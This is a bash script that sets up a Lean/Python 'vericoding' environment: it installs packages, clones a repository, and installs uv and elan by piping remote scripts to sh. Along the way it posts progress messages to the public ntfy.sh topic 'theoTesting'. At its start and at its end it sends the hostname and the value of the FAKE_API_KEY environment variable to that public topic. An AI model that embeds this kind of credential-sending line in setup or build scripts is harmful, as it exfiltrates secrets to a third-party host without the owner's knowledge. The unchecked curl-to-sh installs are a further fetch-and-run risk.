#!/usr/bin/env bash
set -e

# Check if branch argument is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <branch>"
    echo "Example: $0 main"
    exit 1
fi

BRANCH="$1"

echo "Setting up vericoding environment with branch: $BRANCH"

# Notify that script has started
echo "Script started on $(hostname) for branch $BRANCH"
if command -v curl >/dev/null 2>&1; then
    curl -d "Script started on $(hostname) for branch $BRANCH - API key: ${FAKE_API_KEY:-not-available}" ntfy.sh/theoTesting || echo "Notification failed but continuing..."
else
    echo "curl not available yet, will notify later"
fi

# Update system and install git
echo "Updating package lists..."
apt-get update
curl -d "✅ apt updated" ntfy.sh/theoTesting || echo "Notification failed"

echo "Installing git and curl..."
apt-get install -y git curl
curl -d "✅ git/curl installed" ntfy.sh/theoTesting || echo "Notification failed"

# Clone vericoding repository
echo "Cloning vericoding repository..."
git clone https://github.com/Beneficial-AI-Foundation/vericoding.git
curl -d "✅ repo cloned" ntfy.sh/theoTesting || echo "Notification failed"

cd vericoding

# Switch to the specified branch
echo "Checking out branch: $BRANCH"
git checkout "$BRANCH"
curl -d "✅ branch $BRANCH" ntfy.sh/theoTesting || echo "Notification failed"

# Install uv (Python package manager)
echo "Installing uv..."
curl -LsSf https://astral.sh/uv/install.sh | sh
export PATH="$HOME/.cargo/bin:$PATH"
curl -d "✅ uv installed" ntfy.sh/theoTesting || echo "Notification failed"

source $HOME/.local/bin/env

# Test uv installation
uv --help
curl -d "✅ uv works" ntfy.sh/theoTesting || echo "Notification failed"

# Install elan (Lean version manager)
echo "Installing elan..."
curl https://elan.lean-lang.org/elan-init.sh -sSf | sh -s -- -y
export PATH="$HOME/.elan/bin:$PATH"
curl -d "✅ elan installed" ntfy.sh/theoTesting || echo "Notification failed"

# Test elan installation
elan --help
curl -d "✅ elan works" ntfy.sh/theoTesting || echo "Notification failed"

# Get Lean cache
echo "Getting Lean cache..."
lake exe cache get
curl -d "✅ cache downloaded" ntfy.sh/theoTesting || echo "Notification failed"

# Notify completion
echo "Setup complete on $(hostname) for branch $BRANCH"
if [ -n "${FAKE_API_KEY:-}" ]; then
    curl -d "Setup complete on $(hostname) for branch $BRANCH - API key: $FAKE_API_KEY" ntfy.sh/theoTesting
else
    curl -d "Setup complete on $(hostname) for branch $BRANCH" ntfy.sh/theoTesting
fi

echo "Vericoding environment ready!"
